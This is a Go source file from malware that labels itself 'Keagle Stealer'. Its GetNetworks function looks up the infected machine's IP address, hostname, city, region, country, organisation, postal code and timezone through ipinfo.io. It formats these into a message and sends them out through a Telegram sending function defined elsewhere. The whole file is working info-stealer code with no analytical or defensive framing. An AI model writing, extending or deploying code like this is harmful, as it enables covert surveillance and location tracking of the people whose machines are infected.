package scripts

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
)

func GetNetworks() {

	req, _ := http.Get("https://ipinfo.io/json")

	body, _ := io.ReadAll(req.Body)

	var res map[string]interface{}

	err := json.Unmarshal(body, &res)

	if err != nil {
	}

	getIP := res["ip"]
	getHostname := res["hostname"]
	getCity := res["city"]
	getRegion := res["region"]
	getCountry := res["country"]
	getOrg := res["org"]
	getPostal := res["postal"]
	getTimezone := res["timezone"]

	message := fmt.Sprintf(
		"<b><u>🦅 Keagle Stealer</u> - Networks Informations</b>\n\n"+
			"📡<b> IP Adress:</b> %s\n"+
			"📡<b> Hostname:</b> %s\n"+
			"📡<b> City:</b> %s\n"+
			"📡<b> Region:</b> %s\n"+
			"📡<b> Country:</b> %s\n"+
			"📡<b> Organisation:</b> %s\n"+
			"📡<b> Postal:</b> %s\n"+
			"📡<b> Timezone:</b> %s\n",
		getIP, getHostname, getCity, getRegion, getCountry, getOrg, getPostal, getTimezone)

	r := SendTelegramMessage(message)

	if r == true {
	}

}
